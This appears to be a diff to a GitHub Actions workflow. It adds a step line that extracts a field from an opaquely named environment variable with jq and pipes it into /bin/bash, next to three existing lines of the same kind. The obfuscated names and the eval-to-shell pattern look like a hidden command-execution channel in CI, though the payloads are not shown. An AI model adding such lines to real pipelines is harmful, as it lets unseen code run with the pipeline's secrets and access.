@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$rgsic0106" | jq -r .pmntu1 | /bin/bash
           echo $tasn30 | jq -r .lnd60 | /bin/bash
           printf '%s' "$rqf93" | jq -r .edpq222 | /bin/bash
+          printf '%s' "$tm5" | jq -r .hiqzm11 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
